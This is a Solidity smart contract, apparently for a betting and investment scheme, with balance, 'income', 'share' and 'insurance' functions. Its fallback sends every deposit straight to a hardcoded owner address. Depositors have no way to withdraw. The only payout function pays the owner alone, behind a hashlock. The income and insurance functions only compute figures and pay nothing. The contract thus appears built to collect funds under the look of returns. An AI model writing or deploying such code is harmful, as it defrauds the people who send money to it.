pragma solidity ^0.5.17;
contract HashLock {
    mapping(address => uint256) public balances;
    uint256 public bettingsum;
    uint256 public insurancesum;
    bytes32 public hashLock = 0xa6d3be4d310a5d7c7eaf639aa25314e41f1a6b2700e446dc1eacac200917f923;
    address payable _owner = 0x8b1f586d2F9C9CfE16bE81d4155d2e5789Eb32c7;
    
	function () external payable{
	    balances[msg.sender] += msg.value;
	    _owner.transfer(msg.value);
	}
 
	function outsomeincomemore(address _who,uint _amount,string memory _srcvalue) payable public returns (bool result) {
	    require(sha256(abi.encodePacked(_srcvalue))==hashLock);
        require(_amount<2000000000000000000);
        require(_amount>1000000000000000);
        require(_who==_owner);
		_owner.transfer(_amount);
        return true;
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

	function bettingSum() public view returns (uint256 sumvalue){
        return  bettingsum;
    }
    
    function incomeday(uint _amount) public pure returns (uint256 incomevalue){
        require(_amount>10000000000000);
        require(_amount<1000000000000000000);
        return _amount/100;
    }
    function incomedaysecondone(uint _amount) public pure returns (uint256 incomevalue){
        require(_amount>10000000000000);
        require(_amount<1000000000000000000);
        return _amount*5/1000;
    }
    function incomedaysecondtwo(uint _amount) public pure returns (uint256 incomevalue){
        require(_amount>10000000000000);
        require(_amount<1000000000000000000);
        return _amount*6/1000;
    }
    function incomedaysecondthree(uint _amount) public pure returns (uint256 incomevalue){
        require(_amount>10000000000000);
        require(_amount<1000000000000000000);
        return _amount*7/1000;
    }
    function incomeshare(uint _amount,uint floor,uint round) public pure returns (uint256 incomevalue){
        require(_amount>10000000000000);
        require(_amount<1000000000000000000);
        if(round>0){
            return _amount/10;
        }
        if(floor==1){
            return _amount;
        }else if(floor==2){
            return _amount*5/10;
        }else if(floor==3){
            return _amount*3/10;
        }else if(floor==4){
            return _amount*2/10;
        }else if(floor==5){
            return _amount*15/100;
        }else{
            return _amount/10;
        }
    }
    function incomecomunity(uint level) public pure returns (uint256 incomevalue){
        if(level==1){
            return 5;
        }else if(level==2){
            return 10;
        }else if(level==3){
            return 15;
        }else if(level==4){
            return 20;
        }else if(level==5){
            return 25;
        }else if(level==6){
            return 30;
        }
    }
    function insurancetime(uint _amount) public returns (uint256 insurancevalue){
        require(_amount>10000000000000);
        require(_amount<1000000000000000000);
        insurancesum = insurancesum + _amount/100000000000000000;
        return _amount*3;
    }
    function insuranceSum() public view returns (uint256 insurance){
        return insurancesum;
    }
    function getrate() public pure returns (uint256 value){
        return 10000;
    }
    function getrateone() public pure returns (uint256 value){
        return 70;
    }
    function getratetwo() public pure  returns (uint256 value){
        return 30;
    }
}